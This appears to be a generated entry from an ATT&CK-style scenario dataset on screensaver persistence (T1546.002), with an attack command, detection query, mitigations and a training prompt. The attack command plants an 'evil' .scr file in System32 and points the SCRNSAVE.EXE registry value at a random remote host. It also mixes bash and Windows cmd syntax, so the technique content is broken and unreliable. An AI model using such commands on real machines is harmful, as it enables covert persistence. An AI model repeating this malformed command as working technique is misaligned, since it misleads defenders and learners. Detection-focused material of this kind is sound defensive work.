---
type: campaign
scenario_id: 193
tactic: Persistence
technique: "T1546.002: Screensaver"
technique_id: T1546.002
tags: [campaign, lotl, persistence]
---

# Using malicious screensaver remotely for persistence.

## Threat Description
Using malicious screensaver remotely for persistence.

## Attack Command
```
copy $(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).scr) %windir%\System32 && reg add "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).scr) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)"
```

## Detection Logic
Monitor screensaver changes: `reg query "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE | findstr http`; Event ID 4657.

## Mitigation
Restrict screensaver writes: `icacls %windir%\System32\*.scr /deny Everyone:WX`; Disable screensavers: `reg add "HKCU\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d 0`.

## AI Training Prompt
Train AI to detect remote screensaver installations and suggest registry protections.

## References
- MITRE ATT&CK T1546.002: https://attack.mitre.org/techniques/T1546/002/
- CWE-732: https://cwe.mitre.org/data/definitions/732.html
